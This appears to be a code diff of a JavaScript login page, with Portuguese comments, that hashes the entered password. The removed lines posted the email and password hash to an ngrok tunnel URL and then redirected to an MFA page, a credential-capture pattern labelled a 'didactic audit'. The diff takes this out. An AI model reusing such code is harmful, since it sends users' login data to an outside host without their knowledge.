@@ -29,33 +29,13 @@
     const senhaHash = CryptoJS.SHA256(senha).toString();
 
     const dadosUsuario = {
-      email: email,
-      senhaHash: senhaHash
-    };
+  email: email,
+  senhaHash: senhaHash
+};
 
-    // Salva temporariamente no navegador
-    localStorage.setItem("usuarioTemp", JSON.stringify(dadosUsuario));
-
-    // 🔄 Envia para o servidor local
-    fetch("https://400920d4110a.ngrok-free.app/dados", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(dadosUsuario)
-    })
-    .then(res => {
-      if (res.ok) {
-        console.log("✅ Dados enviados com sucesso!");
-      } else {
-        console.warn("❌ Erro ao enviar os dados.");
-      }
-      // Avança mesmo com falha de envio, já que é só auditoria didática
-      window.location.href = "mfa.html";
-    })
-    .catch(err => {
-      console.error("⚠️ Erro de conexão:", err);
-      // Avança mesmo assim
-      window.location.href = "mfa.html";
-    });
+localStorage.setItem("usuarioTemp", JSON.stringify(dadosUsuario));
+window.location.href = "mfa.html";
+   
   }
 </script>
 
